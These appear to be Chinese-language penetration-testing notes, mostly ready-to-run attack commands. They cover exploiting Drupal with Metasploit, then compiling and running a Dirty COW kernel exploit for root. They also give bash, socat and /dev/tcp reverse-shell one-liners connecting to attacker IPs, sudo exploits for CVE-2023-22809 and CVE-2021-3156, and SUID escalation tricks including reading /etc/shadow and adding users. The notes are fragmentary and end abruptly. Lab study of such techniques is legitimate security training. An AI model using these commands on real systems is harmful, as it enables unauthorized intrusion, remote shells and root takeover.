注册表修复工具：ccleaner

==============================================================================================================================
脏牛靶机
kali:
nmap   IP地址  -p-
发现端口，访问 http://xxx:1898
发现Drupal漏洞可利用

msfconsole
search Drupal
use exploit/unix/webapp/drupal_drupalgeddon2 
show options
set rhosts 10.0.0.5
set rport 1898
run

漏洞利用成功，建立会话！
8、输入shell进入命令行；使用python命令进入交互式模式：
`shell`
`python -c 'import pty; pty.spawn("/bin/bash")'`

whoami
uname -a 


上传Dirty.cpp到kali的/var/www/html，然后通过shell:
wget http://IP/Dirty.cpp 或者 curl http://IP/Dirty.cpp -o Dirty.cpp

编译脚本
执行编译好的脚本文件：
.ccp的文件在Linux系统中无法直接利用，因此需要编译
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow Dirty.cpp -lutil
命令注释：
-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告
-pedantic 允许发出ANSI/ISO C标准所列出的所有警告
-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
-std=c++11就是用按C++2011标准来编译的
-pthread 在Linux中要用到多线程时，需要链接pthread库
-o dcow gcc生成的目标文件,名字为dcow


执行编译好的脚本文件：
./dcow -s
whoami

脏牛2.0的利用：https://www.cnblogs.com/nanhe7/articles/15983002.html

总结：如果可以避免，请不要使用内核漏洞提权。 如果使用它，可能会使计算机崩溃或使
其处于不稳定状态。因此，内核漏洞利用应该是最后的手段。
1.远程主机可能会崩溃，因为许多公开可用的内核漏洞利用都不十分稳定。
2.您可能会成为root用户，然后使系统崩溃。
3.漏洞利用可能会留下痕迹/日志。

==============================================================================================================================


hao.php

bash反弹
同样的本地物理机使用nc监听：
`nc -vv -l -p 8000`
-vv表示显示详细信息
-l表示本地监听
-p指定监听端口

使用菜刀命令行模式或者webshell命令行模式在目标机器，执行命令：
==bash  #进入bash命令==
==bash -i >& /dev/tcp/10.0.0.1/8000 0>&1  #执行反弹操作==


bash -i    ：    打开一个交互式的bash shell
/dev/tcp/IP/PORT    ： /dev/tcp/是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。 
0>&1  : 将输入重定向到标准输出，为了确保命令执行后的输入被正确的传回攻击机

其实以上bash反弹一句完整的解读过程就是：
bash产生了一个交互环境与本地主机主动发起与目标主机8000端口建立的连接（即TCP 8000 会话连
接）相结合，然后在重定向个Tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。

当然Linux反弹shell的方式不止这两种，还有其他方式，但是我们记住这两个已经够用了：
==1，是利用木马的功能去反弹，本地用NC进行监听。（冰蝎去连接木马的话是自带反弹功能）==
==2，是利用bash命令去反弹，本地使用NC去监听。==

附录：
反弹shell生成网址：
https://forum.ywhack.com/shell.php


nc -lvvp 6666 
cat < /dev/tcp/192.168.42.132/6666

nc -lvvp 6666 
echo hello > /dev/tcp/192.168.42.132/6666

`socat tcp-connect:10.0.0.1:2233 exec:'bash -li',pty,stderr,setsid,sigint,sane`


==============================================================================================================================
**==Linux_sudo提权==**

sudo 允许系统管理员将权限委托给某些用户(或用户组),能够以root用户或其他用户身份运行部分(或
全部)命令。
sudo的提权原理是通过配置文件（/etc/sudoers）来授权，这个文件定义了那些用户可以使用sudo，以及可以执行哪些命令和以哪个用户的身份执行；sudo命令在执行过程中会读取这个配置文件，如果说sudoers这个配置文件有误或者被篡改，就会导致一些普通用户能够以root身份执行命令导致危害！

sudo提权演示两个编号的漏洞：CVE-2023-22809和CVE-2021-3156

一、漏洞CVE-2023-22809
==漏洞影响的版本:
sudo: 1.8.0~1.9.12p1

1，首先查看目标Linux服务器的的SUDO命令的版本
`sudo -V`
`或`
`sudo --version`


2，在命令行进入对方/tmp目录，上传EXP脚本：SUDO-EXP.sh
sudo 允许系统管理员将权限委托给某些用户(或用户组),能够以root用户或其他用户身份运行部分(或
全部命令。

3，给脚本文件给上最高权限：777,然后利用bash命令或者直接./执行
`chmod 777 SUDO-EXP.sh`
`./SUDO-EXP.sh`


二、漏洞CVE-2021-3156
这个漏洞被披露于2021年1月26日。漏洞的载体是我们常用的sudo命令。当sudo通过-s或-i命令行选
项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行
sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常
是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。

漏洞影响版本：
sudo: 1.8.2 - 1.8.31p2
sudo: 1.9.0 - 1.9.5p1

具体利用步骤：
1，`sudo -V`
2，切换到/tmp目录，在/tmp目录新建一个文件夹并进入新建的文件夹中
mkdir 1
cd 1
3，切换到新建得目录，上传对应得EXP脚本（CVE-2021-3156-main）
4，make
5，./sudo-hax-me-a-sandwich
.
脚本运行之后我们输入whoami检查
成功提权到root！





==============================================================================================================================

**==Linux_SUID提权==**

SUID是什么？
是一种特殊权限，设置了SUID的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限。
例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。
为什么要给Linux二进制文件设置这种权限呢？
例如，程序ping命令其实是需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，所以这时root账户给ping命令设置一个SUID权限，那么所有的普通用户在执行这个命令的时候，都会暂时拥有root账户的权限（相当于古代皇帝给将军的虎符，手持虎符就可以调用军队）攻击者可以利用这个SUID权限来达到执行root权限的目的。



SUID提权具体利用步骤：
先在本地查找符合条件的文件，使用以下三个命令：
==find / -user root -perm -4000 -print 2>/dev/null==
==find / -perm -u=s -type f 2>/dev/null==
==find / -user root -perm -4000 -exec ls -ldb {} \;==
输入命令之后，可以查看当前主机哪些文件或者命令被设置了SUID权限。


==一般常用于SUID提权的文件有==：
Nmap
nmap命令的利用：
较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。

1、find / -user root -perm -4000 -print 2>/dev/null
2、chmod +s /usr/bin/nmap
3、可以使用下命令进入nmap交互模式
nmap --interactive
4、执行命令后会返回一个shell
接着输入：!sh
即可提权为root

Vim
Vim命令的利用：
Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件
vim /etc/shadow
vim /etc/passwd


find
1、find / -user root -perm -4000 -print 2>/dev/null
2、chmod +s /usr/bin/find
3、touch test
`find test -exec whoami  \;`
`find test -exec useradd bbb \;`

Bash
1、find / -user root -perm -4000 -print 2>/dev/null
2、chmod +s /usr/bin/find
3、bash -p
此时可以直接弹出交互式命令行以root的身份去执行一些操作了

More

Less
less命令的利用：
当发现less命令具有SUID权限时，可直接使用命令：
less /etc/passwd
!/bin/sh

Nano
cp








==============================================================================================================================
